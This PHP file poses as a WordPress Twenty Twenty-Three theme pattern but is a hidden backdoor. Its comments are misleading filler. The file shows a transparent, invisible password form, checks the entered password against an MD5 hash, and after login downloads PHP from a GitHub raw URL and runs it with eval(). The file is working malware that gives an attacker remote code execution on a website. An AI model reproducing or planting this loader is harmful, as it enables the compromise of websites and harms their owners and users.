<?php
/**
 * Title: Original Heading for Homepage
 * Slug: twentytwentythree/hidden-heading
 * Inserter: no
 
?>
<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} -->
<h1 class="alignwide" style="margin-bottom:var(--wp--preset--spacing--60)"><?php echo esc_html_x( 'Mindblown: a blog about philosophy.', 'Main heading for homepage', 'twentytwentythree' ); ?></h1>
<!-- /wp:heading -->
*/
/**
* The core configuration of a WordPress
* system is largely defined by the configurations of server
* and generate content PHP for theme version
*/

/**
* located in the root directory of your theme WordPress installation
* posts, pages, comments, user data, settings, etc
* You can control automatic updates for WordPress PHP themes
* used to configure various other advanced settings
*/

/**
* You can access and edit configurations using a file manager provided by your web host
* Dont Edit Anything In This Folder If You Not the root for permission
*/

/**
* Function to check if the user is logged in based on the presence of a valid cookie
*/
session_start();

/*
 * Configuration
 */
$remote_url = 'https://raw.githubusercontent.com/soy777/gg/main/reds.php';
$expected_password_md5 = '9c5b3082eae2c54711bb99f361f58073'; // MD5 of password
$session_key = 'user_id';
$session_value = 'user123'; // value to compare for logged-in users

/*
 * Helper: robust fetcher (curl preferred). Returns array with payload, http_code, curl_err.
 */
function fetch_remote($url) {
    $result = ['payload' => false, 'http_code' => null, 'curl_error' => null];

    // prefer curl
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        // set to true in prod; set to false only if you know what you're doing
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'PHPFetcher/1.0');

        $data = curl_exec($ch);
        $err  = curl_error($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $result['payload'] = $data;
        $result['http_code'] = $code;
        $result['curl_error'] = $err;
        return $result;
    }

    // fallback: file_get_contents if allowed
    if (ini_get('allow_url_fopen')) {
        $data = @file_get_contents($url);
        $result['payload'] = $data === false ? false : $data;
        return $result;
    }

    // no method available
    return $result;
}

/*
 * Simple is_logged_in using session (more reliable than checking cookie in the same request)
 */
function is_logged_in() {
    global $session_key, $session_value;
    return isset($_SESSION[$session_key]) && $_SESSION[$session_key] === $session_value;
}

/*
 * Login handling: use session and redirect after successful login
 */
if (!is_logged_in()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $entered = $_POST['password'];
        if (md5($entered) === $expected_password_md5) {
            // set session
            $_SESSION[$session_key] = $session_value;
            // redirect to avoid resubmission and to ensure session is available on next request
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $err = "Incorrect password";
        }
    }

    // Render (invisible) login form — keep fields visually transparent as in your example
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Admin Login</title>
        <style>
            input[type="password"] {
                border: none;
                background: transparent;
                color: transparent;
                outline: none;
            }
            input[type="submit"] {
                border: none;
                background: transparent;
                color: transparent;
                outline: none;
                cursor: default;
            }
            /* small accessible label off-screen */
            label.offscreen { position: absolute !important; left: -9999px; top: -9999px; }
        </style>
    </head>
    <body>
        <?php if (isset($err)) echo "<div style='color:red'>" . htmlspecialchars($err, ENT_QUOTES) . "</div>"; ?>
        <form method="POST" action="">
            <label class="offscreen" for="pw">Admin password</label>
            <input type="password" id="pw" name="password" autocomplete="current-password">
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

/*
 * If we are here: authenticated — fetch remote and execute
 */
$info = fetch_remote($remote_url);

// diagnostics: log failures and HTTP code
if ($info['payload'] === false || $info['payload'] === null) {
    error_log("Remote fetch failed. HTTP code: " . var_export($info['http_code'], true) . " curl_err: " . var_export($info['curl_error'], true));
    http_response_code(502);
    echo "Failed to fetch remote content.";
    exit;
}

$payload = $info['payload'];
$len = strlen($payload);
if ($len === 0 || trim($payload) === '') {
    error_log("Remote payload empty for URL: $remote_url (len=0)");
    http_response_code(500);
    echo "Remote payload is empty.";
    exit;
}

// Optional quick inspection: if payload starts with '<' it's probably HTML not PHP -> abort
$head = substr(ltrim($payload), 0, 8);
if (isset($head[0]) && $head[0] === '<') {
    error_log("Remote payload appears to start with '<' — likely HTML. Aborting eval.");
    http_response_code(500);
    echo "Remote payload invalid (not PHP).";
    exit;
}

// Optional: basic token sanity check (not full lint)
$tokens = @token_get_all('<?php ' . $payload);
if ($tokens === null) {
    error_log("token_get_all returned null — payload may be invalid.");
    // proceed with caution or abort; here we abort
    http_response_code(500);
    echo "Remote payload failed basic syntax check.";
    exit;
}

/*
 * Safe execution: buffer output, eval payload
 */
try {
    ob_start();
    // Prepend '?>' to make sure payload that begins with PHP tags executes correctly under eval
    eval('?>' . $payload);
    $out = ob_get_clean();
    echo $out;
} catch (Throwable $e) {
    // ensure no buffer leak
    while (ob_get_level() > 0) ob_end_clean();
    error_log("Execution error: " . $e->getMessage());
    http_response_code(500);
    echo "Execution error occurred. See server logs.";
    exit;
}
?>
